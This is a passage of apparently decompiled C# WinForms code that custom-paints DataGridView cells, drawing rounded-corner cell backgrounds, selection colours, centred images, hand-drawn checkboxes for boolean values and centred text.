			else if (columnIndex == num)
			{
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: false, roundTopRight: true, roundBottomRight: true, roundBottomLeft: false);
			}
			else
			{
				graphicsPath = new GraphicsPath();
				graphicsPath.AddRectangle(cellBounds);
			}
			Color color = default(Color);
			Color color2;
			if (dataGridView.Rows[e.RowIndex].Selected)
			{
				color = Color.FromArgb(14, 22, 33);
				color2 = Color.FromArgb(2, 176, 117);
			}
			else
			{
				Color foreColor = dataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Style.ForeColor;
				color2 = ((!foreColor.IsEmpty) ? foreColor : Color.FromArgb(145, 163, 182));
			}
			using (SolidBrush brush2 = new SolidBrush(color))
			{
				using Pen pen = new Pen(color);
				e.Graphics.FillPath(brush2, graphicsPath);
				e.Graphics.DrawPath(pen, graphicsPath);
			}
			if (e.Value != null && e.Value is Image)
			{
				Image image = (Image)e.Value;
				Rectangle rect = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - image.Width) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - image.Height) / 2), image.Width, image.Height);
				e.Graphics.DrawImage(image, rect);
			}
			else
			{
				if (e.Value == null)
				{
					return;
				}
				if (e.Value is bool)
				{
					bool flag = Conversions.ToBoolean(e.Value);
					int num2 = 14;
					Rectangle rect2 = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - num2) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - num2) / 2), num2, num2);
					using (Pen pen2 = new Pen(color2, 2f))
					{
						e.Graphics.DrawRectangle(pen2, rect2);
					}
					if (flag)
					{
						GraphicsPath graphicsPath2 = new GraphicsPath();
						graphicsPath2.AddLines(new Point[3]
						{
							new Point(rect2.Left + 3, rect2.Top + unchecked(num2 / 2)),
							new Point(rect2.Left + unchecked(num2 / 2) - 1, rect2.Bottom - 3),
							new Point(rect2.Right - 3, rect2.Top + 3)
						});
						using Pen pen3 = new Pen(color2, 2f);
						e.Graphics.DrawPath(pen3, graphicsPath2);
					}
				}
				else
				{
					TextRenderer.DrawText(e.Graphics, e.FormattedValue.ToString(), e.CellStyle.Font, cellBounds, color2, TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.WordBreak);
				}
			}
		}
	}
}
